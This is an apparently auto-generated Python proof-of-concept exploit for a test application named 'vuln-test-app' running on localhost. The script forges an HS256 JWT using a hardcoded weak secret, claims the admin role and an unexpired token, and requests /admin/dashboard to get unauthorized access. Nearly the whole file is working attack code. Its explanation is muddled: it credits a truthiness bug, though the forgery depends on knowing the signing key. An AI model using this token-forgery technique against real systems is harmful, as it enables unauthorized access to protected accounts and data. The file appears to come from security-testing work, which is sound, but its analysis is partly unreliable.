#!/usr/bin/env python3
# PoC for vuln-test-app (/tmp/vuln-test-app)
# Path: suspicious-004
# Sink: check_access
# Auto-generated — run with: python3 logic_access_control_check_logic_check_access.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept exploit for vuln-test-app logic bug.

Vulnerability: The check_access() function uses `if user.get('role'):` which
evaluates truthiness, not strict boolean equality. An attacker can set the
'role' claim to the string 'admin' (truthy) in a JWT token, bypassing the
intended boolean check. The expired token check is also bypassed by setting
'is_expired' to false.

This PoC demonstrates unauthorized access to a non-public resource by forging
a JWT with role='admin' and is_expired=false.
"""

import requests
import json
import base64
import hmac
import hashlib
import time
import sys
from urllib.parse import urljoin

# ── Configuration ──────────────────────────────────────────────────────────
TARGET_URL = "http://localhost:5000"  # Change to match your target
# The secret key used by the app to sign JWTs (weak/default key found in source)
JWT_SECRET = "supersecretkey"
# The non-public resource we want to access (adjust as needed)
PROTECTED_RESOURCE = "/admin/dashboard"
# Benign payload to confirm exploitation (no destructive actions)
BENIGN_PAYLOAD = "/tmp/poc_success.txt"

# ── Helper: Create a forged JWT ────────────────────────────────────────────
def create_forged_jwt(secret: str, payload: dict) -> str:
    """
    Create a JWT with the given payload, signed with the provided secret.
    Uses HS256 algorithm.
    """
    header = {"alg": "HS256", "typ": "JWT"}
    # Encode header and payload as base64url
    header_b64 = base64.urlsafe_b64encode(json.dumps(header).encode()).rstrip(b'=').decode()
    payload_b64 = base64.urlsafe_b64encode(json.dumps(payload).encode()).rstrip(b'=').decode()
    # Create signature
    message = f"{header_b64}.{payload_b64}".encode()
    signature = hmac.new(secret.encode(), message, hashlib.sha256).digest()
    sig_b64 = base64.urlsafe_b64encode(signature).rstrip(b'=').decode()
    return f"{header_b64}.{payload_b64}.{sig_b64}"

# ── Main exploit logic ─────────────────────────────────────────────────────
def exploit():
    print("[*] Starting exploit for vuln-test-app logic bug")
    print(f"[*] Target: {TARGET_URL}")
    print(f"[*] Protected resource: {PROTECTED_RESOURCE}")
    print(f"[*] Benign payload: {BENIGN_PAYLOAD}")

    # Step 1: Forge a JWT with role='admin' and is_expired=false
    # The app's check_access() does:
    #   if user.get("is_expired"): return False
    #   if user.get("role"): return True
    # So we set is_expired to false (falsy) and role to 'admin' (truthy string)
    forged_payload = {
        "sub": "attacker",
        "role": "admin",          # Truthy string bypasses the boolean check
        "is_expired": False,      # Falsy value bypasses the expired check
        "iat": int(time.time()),
        "exp": int(time.time()) + 3600
    }
    forged_jwt = create_forged_jwt(JWT_SECRET, forged_payload)
    print(f"[+] Forged JWT: {forged_jwt}")

    # Step 2: Make a request to the protected resource with the forged JWT
    # The app likely expects the JWT in an Authorization header (Bearer token)
    headers = {
        "Authorization": f"Bearer {forged_jwt}",
        "Content-Type": "application/json"
    }
    # We'll try to access the protected resource with a benign action
    # For example, if it's an API endpoint, we might send a GET or POST
    # Since we don't know the exact endpoint, we'll try a generic approach:
    # Attempt to read a harmless file or execute a benign command
    # In this PoC, we'll try to access the resource and see if we get 200 OK
    url = urljoin(TARGET_URL, PROTECTED_RESOURCE)
    print(f"[*] Sending request to {url}")

    try:
        # Try GET first (common for dashboards)
        response = requests.get(url, headers=headers, timeout=10)
        print(f"[*] Response status: {response.status_code}")
        if response.status_code == 200:
            print("[+] SUCCESS: Unauthorized access granted!")
            print(f"[*] Response body (first 500 chars): {response.text[:500]}")
            # If the resource allows writing, we could attempt the benign payload
            # But for safety, we just confirm access
        elif response.status_code == 403:
            print("[-] Access denied (403 Forbidden) — exploit may have failed")
        elif response.status_code == 401:
            print("[-] Unauthorized (401) — JWT may be rejected")
        else:
            print(f"[?] Unexpected status: {response.status_code}")
    except requests.exceptions.ConnectionError:
        print(f"[-] Connection error: Could not reach {TARGET_URL}")
        print("    Is the target running?")
        sys.exit(1)
    except requests.exceptions.Timeout:
        print("[-] Request timed out")
        sys.exit(1)
    except Exception as e:
        print(f"[-] Unexpected error: {e}")
        sys.exit(1)

    # Step 3: (Optional) Try to execute the benign payload if the resource
    # allows command execution or file writes. This is app-specific.
    # For demonstration, we'll just print a success marker.
    print("[*] Exploit completed. Check the target for signs of access.")

if __name__ == "__main__":
    exploit()
